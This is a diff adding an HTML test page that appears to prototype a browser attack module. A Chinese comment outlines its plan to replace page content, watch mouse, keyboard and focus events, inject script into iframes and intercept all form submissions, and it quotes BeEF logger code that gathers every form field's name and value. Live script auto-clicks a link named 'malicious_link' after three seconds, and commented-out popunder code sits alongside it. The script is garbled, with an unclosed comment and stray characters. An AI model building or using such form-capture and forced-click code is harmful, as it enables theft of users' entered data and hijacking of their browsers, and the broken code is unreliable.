@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>title</title>
+</head>
+<body>
+    
+<script src='http://localhost/well/js/jquery-1.7.2.min.js'></script>
+
+<script>
+console.log($().jquery);
+</script>
+
+
+<a id="malicious_link" target="_blank" href="http://www.baidu.com" onclick="open_link()">Goo</a>
+
+<script src='http://localhost/well/s/2.js'></script>
+
+<script>
+
+
+/*
+自动攻击模块设计
+
+
+替换图标、标题、文档内容
+
+监听鼠标点击事件、键盘事件、窗口焦点事件
+
+$j(window).focus(function(event) { 
+ alert("The window has been focused"); 
+}).blur(function(event) { 
+ alert("The window has lost focus"); 
+});
+
+遍历iframe注入js
+
+拦截所有表单提交
+
+$j('form').submit( 
+ function(e) { beef.logger.submit(e); } 
+});
+/** 
+ * 只要有表单提交，就将激发submit函数
+ */ 
+submit: function(e) { 
+ try { 
+ var f = new beef.logger.e(); 
+ var values = ""; 
+ f.type = 'submit'; 
+ f.target = beef.logger.get_dom_identifier(e.target); 
+ for (var i = 0; i < e.target.elements.length; i++) { 
+ values += "["+i+"]"; 
+ values +=e.target.elements[i].name; 
+ values +="="+e.target.elements[i].value+"\n"; 
+ } 
+ f.data = 'Action: '+$j(e.target).attr('action'); 
+ f.data += ' - Method: '+$j(e.target).attr('method'); 
+ f.data += ' - Values:\n'+values; 
+ this.events.push(f); 
+ } c
+
+
+
+
+// function open_link(){ 
+// window.open('http://www.baidu.com','popunder',toolbar=0, 
+//  location=0,directories=0,status=0,menubar=0,scrollbars=0, 
+//  resizable=0,width=1,height=1,left='+screen.width+', 
+//  top='+screen.height+').blur(); 
+// window.focus(); 
+// } 
+function clickLink(link) { 
+ var cancelled = false; 
+ if (document.createEvent) { 
+ var event = document.createEvent("MouseEvents"); 
+ event.initMouseEvent("click", true, true, window, 
+ 0, 0, 0, 0, 0, false, false, false, false, 0, null); 
+ link.dispatchEvent(event); 
+ }else if(link.fireEvent){ 
+ link.fireEvent("onclick"); 
+ } 
+} 
+setTimeout(function() {
+clickLink(document.getElementById('malicious_link'));
+}, 3000);
+
+
+// window.open(
+//     'https://www.baidu.com','popunder','toolbar=0',
+// location=0,directories=0,status=0,menubar=0,scrollbars=0, 
+//  resizable=0,width=1,height=1,left='+screen.width+', 
+//  top='+screen.height+').blur(); 
+// window.focus();
+
+// setInterval(function() {
+// console.log($().jquery);
+
+
+
+
+</script>
+
+
+
+
+
+
+
+ 
+</body>
+</html>
